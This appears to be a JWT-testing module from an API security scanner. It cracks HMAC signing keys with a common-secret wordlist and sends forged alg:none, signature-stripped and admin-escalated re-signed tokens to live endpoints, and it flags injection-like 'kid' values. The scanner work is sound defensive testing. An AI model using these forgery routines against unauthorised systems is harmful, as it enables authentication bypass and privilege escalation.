"""JWT analysis and token forgery acceptance checks."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any, Dict, Iterable, List, Optional, Tuple

from ..engine import looks_authorised
from ..models import Endpoint, Finding
from .base import Check, register

COMMON_SECRETS = [
    "secret", "secretkey", "secret_key", "SECRET_KEY", "jwtsecret", "jwt_secret",
    "your-256-bit-secret", "your_jwt_secret", "changeme", "change-me", "password",
    "Password1", "admin", "test", "key", "private", "signature", "token", "mysecret",
    "my_secret", "supersecret", "super_secret", "s3cr3t", "qwerty", "123456",
    "12345678", "1234567890", "letmein", "default", "dev", "development", "staging",
    "production", "prod", "hello", "hmac", "shhhhh", "topsecret", "top_secret",
    "keyboard cat", "iamasecret", "MyS3cr3tK3y", "jwtkey", "jwt", "auth", "authsecret",
    "api_secret", "gatecrashret", "clientsecret", "client_secret", "n0Tvery$ecret",
    "abcdefghijklmnopqrstuvwxyz", "0000000000000000", "aaaaaaaaaaaaaaaa", "null",
    "undefined", "example_key", "example-secret", "insecure", "unsafe", "please-change",
]


def b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def parse_jwt(token: str) -> Optional[Tuple[Dict, Dict, str]]:
    parts = token.split(".")
    if len(parts) not in (2, 3):
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, (parts[2] if len(parts) == 3 else "")


def crack_hs(token: str, wordlist: List[str]) -> Optional[str]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = parse_jwt(token)
    if not header:
        return None
    alg = str(header[0].get("alg", "")).upper()
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}.get(alg)
    if not digest:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        expected = b64url_decode(parts[2])
    except Exception:
        return None
    for candidate in wordlist:
        computed = hmac.new(candidate.encode(), signing_input, digest).digest()
        if hmac.compare_digest(computed, expected):
            return candidate
    return None


def sign_hs256(header: Dict, payload: Dict, secret: str) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


SENSITIVE_CLAIMS = ("password", "pwd", "secret", "ssn", "credit", "card", "pan",
                    "api_key", "apikey", "private")


# --------------------------------------------------------------------------

@register
class JwtStaticAnalysis(Check):
    id = "jwt.static"
    name = "JWT structural weaknesses"
    severity = "medium"
    owasp = "API2"
    cwe = "CWE-347"
    passive = True
    per_endpoint = False
    profiles = ("passive", "safe", "aggressive")

    def default_remediation(self) -> str:
        return ("Sign with a high-entropy key held in a secret manager, pin the accepted `alg` "
                "server-side, set a short `exp`, and keep only opaque identifiers in the payload.")

    def run_once(self) -> Iterable[Finding]:
        out: List[Finding] = []
        wordlist = list(COMMON_SECRETS) + self.ctx.config.get("jwt_wordlist", [])
        for identity in self.ctx.identities:
            token = identity.bearer_token()
            if not token:
                continue
            parsed = parse_jwt(token)
            if not parsed:
                continue
            header, payload, signature = parsed
            alg = str(header.get("alg", "?"))
            base = self.ctx.exchange_for_identity(identity)
            evidence = [base] if base else []

            claims_json = json.dumps(payload, indent=2, default=str)[:1200]

            if alg.lower() in ("none", ""):
                out.append(self.finding(
                    None, f"JWT for `{identity.name}` is unsigned (alg: none)",
                    f"The token supplied for identity `{identity.name}` declares `alg: {alg}` and "
                    f"carries no signature, so its claims can be rewritten arbitrarily by the "
                    f"holder.\n\nClaims:\n```json\n{claims_json}\n```",
                    evidence, severity="critical", confidence="firm",
                    evidence_summary=f"header: {json.dumps(header)}",
                ))

            if not signature and alg.lower() not in ("none", ""):
                out.append(self.finding(
                    None, f"JWT for `{identity.name}` has no signature segment",
                    f"The token declares `alg: {alg}` but has no third segment.",
                    evidence, severity="high", confidence="firm",
                    evidence_summary=f"header: {json.dumps(header)}",
                ))

            secret = crack_hs(token, wordlist)
            if secret:
                out.append(self.finding(
                    None, f"JWT signing key recovered offline: `{secret}`",
                    f"The HMAC signing key for identity `{identity.name}`'s token was recovered "
                    f"by testing {len(wordlist)} common secrets offline - no requests were sent "
                    f"to the target to determine this. With the key, an attacker mints tokens "
                    f"for any subject with any role, giving complete authentication bypass and "
                    f"privilege escalation.\n\nClaims:\n```json\n{claims_json}\n```",
                    evidence, severity="critical", confidence="firm",
                    evidence_summary=f"HMAC key `{secret}` verifies the token signature "
                                     f"({alg})",
                    detail={"secret": secret, "alg": alg},
                ))

            exp = payload.get("exp")
            now = time.time()
            if exp is None:
                out.append(self.finding(
                    None, f"JWT for `{identity.name}` has no expiry claim",
                    "The token contains no `exp`, so it stays valid until the signing key is "
                    "rotated. A token captured from a log, a proxy or a mobile device grants "
                    "indefinite access.",
                    evidence, severity="medium", confidence="firm",
                    evidence_summary=f"claims: {', '.join(sorted(payload))}",
                ))
            elif isinstance(exp, (int, float)):
                lifetime_days = (exp - payload.get("iat", now)) / 86400
                if lifetime_days > 30:
                    out.append(self.finding(
                        None, f"JWT for `{identity.name}` has a {lifetime_days:.0f}-day lifetime",
                        f"The token is valid for roughly {lifetime_days:.0f} days. Long-lived "
                        f"bearer tokens cannot be revoked without a denylist and widen the window "
                        f"for any token leak.",
                        evidence, severity="low", confidence="firm",
                        evidence_summary=f"iat->exp span {lifetime_days:.0f} days",
                    ))

            leaky = [k for k in payload if any(s in k.lower() for s in SENSITIVE_CLAIMS)]
            if leaky:
                out.append(self.finding(
                    None, f"Sensitive claims carried in JWT payload: {', '.join(leaky)}",
                    "A JWT payload is base64, not encryption - anyone holding the token can read "
                    f"these claims: {', '.join('`%s`' % k for k in leaky)}.",
                    evidence, severity="medium", confidence="firm",
                    evidence_summary=f"claims present: {', '.join(leaky)}",
                ))

            kid = header.get("kid")
            if isinstance(kid, str) and any(c in kid for c in ("../", "'", "\"", ";", "|", "$(")):
                out.append(self.finding(
                    None, f"JWT `kid` header carries injection-like characters",
                    f"The `kid` header is `{kid}`. If the server uses it to look up a key by "
                    f"file path or SQL query, it is an injection sink reachable before "
                    f"authentication completes.",
                    evidence, severity="medium", confidence="tentative",
                    evidence_summary=f"kid: {kid}",
                ))
        return out


@register
class JwtForgeryAccepted(Check):
    id = "jwt.forgery"
    name = "Server accepts a forged or unsigned JWT"
    severity = "critical"
    owasp = "API2"
    cwe = "CWE-347"
    profiles = ("safe", "aggressive")
    per_endpoint = False

    def default_remediation(self) -> str:
        return ("Pin the expected algorithm server-side and reject any token whose header does "
                "not match. Never call a `decode` API that infers the algorithm from the token, "
                "and reject tokens with an empty signature outright.")

    def _target(self):
        """An endpoint that clearly requires the primary identity's credentials."""
        for endpoint, baseline in self.ctx.baseline_pairs():
            if not looks_authorised(baseline) or endpoint.method not in ("GET", "HEAD"):
                continue
            stripped = self.ctx.replay(endpoint, self.ctx.primary, strip_auth=True,
                                       note="baseline: confirm endpoint requires credentials")
            if stripped.status in (401, 403):
                return endpoint, baseline
        return None, None

    def run_once(self) -> Iterable[Finding]:
        identity = self.ctx.primary
        token = identity.bearer_token()
        if not token:
            return []
        parsed = parse_jwt(token)
        if not parsed:
            return []
        header, payload, _ = parsed

        endpoint, baseline = self._target()
        if endpoint is None:
            return []

        out: List[Finding] = []

        # 1. alg: none
        none_header = dict(header, alg="none")
        none_token = (b64url_encode(json.dumps(none_header, separators=(",", ":")).encode())
                      + "." + b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
                      + ".")
        ex = self.ctx.replay(endpoint, identity,
                             headers={"Authorization": f"Bearer {none_token}"},
                             note="forged token with alg:none and an empty signature")
        if looks_authorised(ex):
            out.append(self.finding(
                endpoint,
                "Unsigned JWT accepted (alg: none)",
                f"`{endpoint.method} {endpoint.path}` returns HTTP 401/403 with no credentials, "
                f"but returned HTTP {ex.status} when presented with a token whose header was "
                f"rewritten to `alg: none` and whose signature was removed. The signature is not "
                f"verified, so an attacker can mint a token for any user - including "
                f"administrators - by editing the payload.",
                [baseline, ex], confidence="firm",
                evidence_summary=f"alg:none token accepted -> HTTP {ex.status}",
                detail={"forged_header": none_header},
            ))

        # 2. Signature stripped, algorithm left intact
        parts = token.split(".")
        if len(parts) == 3:
            stripped_token = f"{parts[0]}.{parts[1]}."
            ex2 = self.ctx.replay(endpoint, identity,
                                  headers={"Authorization": f"Bearer {stripped_token}"},
                                  note="original token with the signature segment removed")
            if looks_authorised(ex2):
                out.append(self.finding(
                    endpoint,
                    "JWT accepted with its signature removed",
                    f"Presenting the genuine token with the signature segment deleted still "
                    f"returned HTTP {ex2.status}. The server parses the token without verifying "
                    f"it, so every claim in it is attacker-controlled.",
                    [baseline, ex2], confidence="firm",
                    evidence_summary=f"signature-stripped token accepted -> HTTP {ex2.status}",
                ))

            # 3. Signature corrupted - is it checked at all?
            #
            # Mutate the *decoded* signature, not the base64 text. Flipping the last
            # base64 character often leaves the decoded bytes identical (the trailing
            # bits are discarded), which would send a perfectly valid token and report
            # a critical false positive. Measured at ~3.5% of HS256 tokens.
            bad_token = None
            try:
                raw = bytearray(b64url_decode(parts[2]))
            except Exception:
                raw = bytearray()
            if raw:
                raw[0] ^= 0xFF
                candidate = b64url_encode(bytes(raw))
                if b64url_decode(candidate) != b64url_decode(parts[2]):
                    bad_token = f"{parts[0]}.{parts[1]}.{candidate}"
            if bad_token:
                ex3 = self.ctx.replay(endpoint, identity,
                                      headers={"Authorization": f"Bearer {bad_token}"},
                                      note="original token with one signature byte altered")
                if looks_authorised(ex3):
                    out.append(self.finding(
                        endpoint,
                        "JWT accepted with an invalid signature",
                        f"Altering a single character of the token signature still returned "
                        f"HTTP {ex3.status}. The signature is decorative.",
                        [baseline, ex3], confidence="firm",
                        evidence_summary=f"corrupted signature accepted -> HTTP {ex3.status}",
                    ))

        # 4. Claim tampering with a cracked key
        secret = crack_hs(token, list(COMMON_SECRETS) + self.ctx.config.get("jwt_wordlist", []))
        if secret and isinstance(payload, dict):
            escalated = dict(payload)
            changed = {}
            for claim in ("role", "roles", "scope", "is_admin", "isAdmin", "admin", "groups"):
                if claim in escalated:
                    escalated[claim] = ["admin"] if isinstance(escalated[claim], list) else "admin"
                    changed[claim] = escalated[claim]
            if changed:
                forged = sign_hs256(dict(header, alg="HS256"), escalated, secret)
                ex4 = self.ctx.replay(endpoint, identity,
                                      headers={"Authorization": f"Bearer {forged}"},
                                      note=f"token re-signed with the recovered key `{secret}` "
                                           f"and elevated claims {changed}")
                if looks_authorised(ex4):
                    out.append(self.finding(
                        endpoint,
                        "Privilege escalation via a token re-signed with the recovered key",
                        f"Using the signing key recovered offline (`{secret}`), a token with "
                        f"{', '.join('`%s` = %s' % (k, json.dumps(v)) for k, v in changed.items())} "
                        f"was accepted with HTTP {ex4.status}. This confirms end to end that an "
                        f"attacker can mint arbitrary privileged identities.",
                        [baseline, ex4], confidence="firm",
                        evidence_summary=f"re-signed token with {changed} accepted -> "
                                         f"HTTP {ex4.status}",
                        detail={"secret": secret, "elevated_claims": changed},
                    ))
        return out
